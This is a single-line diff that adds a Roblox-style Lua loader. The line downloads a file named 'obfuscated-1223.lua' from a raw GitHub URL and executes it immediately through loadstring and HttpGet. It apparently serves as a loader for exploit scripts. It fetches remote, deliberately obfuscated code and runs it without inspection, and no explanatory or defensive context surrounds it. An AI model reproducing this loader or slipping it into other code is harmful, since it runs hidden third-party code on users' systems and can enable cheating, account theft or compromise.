@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Venera0/mix/main/obfuscated-1223.lua'))()
